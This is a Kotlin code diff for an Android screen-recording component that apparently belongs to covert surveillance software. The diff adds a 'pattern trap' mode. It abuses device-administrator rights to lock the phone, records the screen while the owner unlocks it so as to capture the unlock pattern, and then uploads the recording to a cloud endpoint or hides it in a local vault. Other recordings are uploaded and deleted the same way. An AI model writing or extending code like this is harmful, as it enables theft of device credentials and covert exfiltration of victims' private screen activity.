@@ -17,11 +17,27 @@ object ScreenRecordManager {
     var pendingDur: Int = 60
     var pendingQual: String = "MED"
     var pendingAudio: Boolean = false
+    var isPatternTrap: Boolean = false
 
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var mediaRecorder: MediaRecorder? = null
+    private var recordJob: Job? = null
+    
     var isRecording = false
+    var isPaused = false
+
+    fun pauseRecording() {
+        if (isRecording && !isPaused && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+            try { mediaRecorder?.pause(); isPaused = true; DebugLogger.log("SCREEN_REC", "Paused (Screen Off)") } catch(e:Exception){}
+        }
+    }
+
+    fun resumeRecording() {
+        if (isRecording && isPaused && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+            try { mediaRecorder?.resume(); isPaused = false; DebugLogger.log("SCREEN_REC", "Resumed (Screen On)") } catch(e:Exception){}
+        }
+    }
 
     fun startRecording(ctx: Context, resultCode: Int, data: Intent) {
         if (isRecording) return
@@ -78,26 +94,35 @@ object ScreenRecordManager {
                 )
                 
                 mediaRecorder?.start()
-                DebugLogger.log("SCREEN_REC", "Recording active: ${pendingDur}s | Quality: $pendingQual | Audio: $pendingAudio")
+                DebugLogger.log("SCREEN_REC", "Recording active: ${pendingDur}s | Quality: $pendingQual | Audio: $pendingAudio | Trap: $isPatternTrap")
                 
-                delay(pendingDur * 1000L)
+                if (isPatternTrap) {
+                    delay(800) // Buffer to ensure frame stream is initialized before lockdown
+                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
+                    if (dpm.isAdminActive(comp)) {
+                        dpm.lockNow()
+                        DebugLogger.log("CAPTURE_PATTERN", "Device locked. Awaiting user unlock...")
+                    }
+                    delay(600_000L) // 10 minutes absolute fallback limit
+                } else {
+                    delay(pendingDur * 1000L)
+                }
                 
             } catch (e: Exception) {
                 DebugLogger.log("SCREEN_REC_ERR", "Capture failed: ${e.message}")
             } finally {
-                stopRecording()
-                if (outputFile.exists() && outputFile.length() > 0) {
-                    if (CloudManager.uploadFile(ctx, outputFile, "SCREEN_RECORD")) {
-                        outputFile.delete()
-                    } else {
-                        DumpManager.vaultMedia(outputFile, "SCREEN_RECORD")
-                    }
-                }
+                internalStop(ctx, outputFile)
             }
         }
     }
 
     fun stopRecording() {
+        // Cancelling the coroutine immediately drops it into the 'finally' block above.
+        recordJob?.cancel()
+    }
+
+    private fun internalStop(ctx: Context, outputFile: File) {
         try { mediaRecorder?.stop() } catch(e:Exception){}
         mediaRecorder?.reset()
         mediaRecorder?.release()
@@ -110,6 +135,18 @@ object ScreenRecordManager {
         mediaProjection = null
         
         isRecording = false
+        isPatternTrap = false
         DebugLogger.log("SCREEN_REC", "Hardware resources released.")
+        
+        if (outputFile.exists() && outputFile.length() > 0) {
+            // Use runBlocking to ensure IO upload thread finishes before cleanup destroys scope
+            runBlocking { 
+                if (CloudManager.uploadFile(ctx, outputFile, "SCREEN_RECORD")) {
+                    outputFile.delete()
+                } else {
+                    DumpManager.vaultMedia(outputFile, "SCREEN_RECORD")
+                }
+            }
+        }
     }
 }
